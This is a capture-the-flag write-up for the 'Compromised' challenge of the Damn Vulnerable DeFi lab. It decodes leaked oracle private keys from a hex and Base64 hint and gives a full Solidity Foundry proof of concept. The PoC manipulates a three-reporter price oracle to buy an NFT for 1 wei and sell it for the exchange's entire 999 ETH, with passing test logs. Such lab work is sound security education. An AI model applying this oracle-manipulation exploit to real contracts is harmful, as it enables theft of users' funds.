# Challenge - Compromised

While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0x188...088, 0xA41...9D8 and 0xab3...a40.

## Objective of CTF

Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.

## Vulnerability Analysis

The exchange relies on three trusted oracles to determine the NFT price, which can be updated by calling the `postPrice()` function in the `TrustfulOracle` contract.

Starting with the hint:

```
4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

Convert the hex strings to ASCII:

```
MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0
MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5
```

Since text is commonly encoded using Base64 in web applications, we first attempted to decode these Base64 strings into UTF-8 text, we reveal the following:

```
0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
```

These hex strings appear to be private keys. By converting these hex strings to addresses:

```
0x188Ea627E3531Db590e6f1D71ED83628d1933088
0xA417D473c40a4d42BAd35f147c21eEa7973539D8
```

We can confirm that they correspond to two of the oracles. Exploiting these addresses allows us to manipulate the NFT price.

### Attack steps:

1. Retrieve the private keys of the trusted oracles from the hint.
2. Impersonate the oracles to set the NFT price to a very low value (1 wei) and purchase it.
3. Impersonate the oracles again to set the NFT price to a high value (e.g., 999 ETH) and sell it.
4. Restore the original oracle prices.
5. Transfer the rescued ETH from the exchange to the `recovery` address.

## PoC test case

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        // 4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130
        // 4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535

        // hex data --> ASCII code
        // MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0
        // MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5

        // Base64 strings --> UTF-8 text
        // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
        // 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159

        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint("ETH balance in the exchange contract", address(exchange).balance, 18);
        emit log_named_decimal_uint("ETH balance in the recovery address", recovery.balance, 18);

        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
        address oracle1 = vm.addr(pk1);
        address oracle2 = vm.addr(pk2);

        // set nft price to 1 wei
        vm.startPrank(oracle1);
        oracle.postPrice(nft.symbol(), 1);
        vm.stopPrank();
        vm.startPrank(oracle2);
        oracle.postPrice(nft.symbol(), 1);
        vm.stopPrank();

        // buy the nft
        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 1}();
        vm.stopPrank();

        // set nft price to the exchange balance
        vm.startPrank(oracle1);
        oracle.postPrice(nft.symbol(), address(exchange).balance);
        vm.stopPrank();
        vm.startPrank(oracle2);
        oracle.postPrice(nft.symbol(), address(exchange).balance);
        vm.stopPrank();

        // sell the nft to get the whole balance from exchange
        vm.startPrank(player);
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        (bool success,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
        require(success, "Fail to send ETH");
        vm.stopPrank();

        // restore the oracle price
        vm.startPrank(oracle1);
        oracle.postPrice(nft.symbol(), INITIAL_NFT_PRICE);
        vm.stopPrank();
        vm.startPrank(oracle2);
        oracle.postPrice(nft.symbol(), INITIAL_NFT_PRICE);
        vm.stopPrank();

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint("ETH balance in the exchange contract", address(exchange).balance, 18);
        emit log_named_decimal_uint("ETH balance in the recovery address", recovery.balance, 18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
```

### Test Result

```
Ran 2 tests for test/compromised/Compromised.t.sol:CompromisedChallenge
[PASS] test_assertInitialState() (gas: 40733)
[PASS] test_compromised() (gas: 263408)
Logs:
  -------------------------- Before exploit --------------------------
  ETH balance in the exchange contract: 999.000000000000000000
  ETH balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  ETH balance in the exchange contract: 0.000000000000000000
  ETH balance in the recovery address: 999.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.72ms (1.34ms CPU time)

Ran 1 test suite in 239.68ms (2.72ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
